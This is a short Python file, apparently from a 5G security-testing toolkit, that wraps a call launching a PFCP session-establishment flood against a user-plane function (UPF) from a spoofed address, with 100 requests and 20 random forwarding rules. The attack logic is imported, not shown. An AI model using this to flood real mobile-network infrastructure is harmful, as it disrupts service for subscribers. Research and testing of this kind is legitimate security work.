from src.attacks.upf_pfcp.pfcpDosAttack import *
from src import *


def pfcp_session_establishment_flood_customized(spoofed_addr):
    PFCPDosAttack.start_pfcp_session_establishment_flood(
        evil_addr=spoofed_addr,
        upf_addr=ip_list["UPF"],
        reqNbr=100,
        random_far_number=20,
    )
